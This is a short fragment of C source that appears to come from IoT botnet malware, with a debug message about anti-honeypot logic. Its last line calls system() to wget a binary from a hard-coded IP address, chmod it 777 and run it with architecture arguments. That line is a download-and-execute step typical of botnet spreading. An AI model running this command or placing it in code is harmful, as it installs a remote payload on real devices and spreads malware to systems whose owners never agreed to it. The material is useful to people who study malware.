...
*/
    ...
    #ifdef DEBUG
    printf("[antihoney] keeping alive because otherwise I die I speak of experience\n");
    #endif
    ...
    #endif
    system("wget http://185.105.4.242/wrgjwrgjwrg246356356356/n4; chmod 777 *; ./n4 wget.echo.telnet.arm");
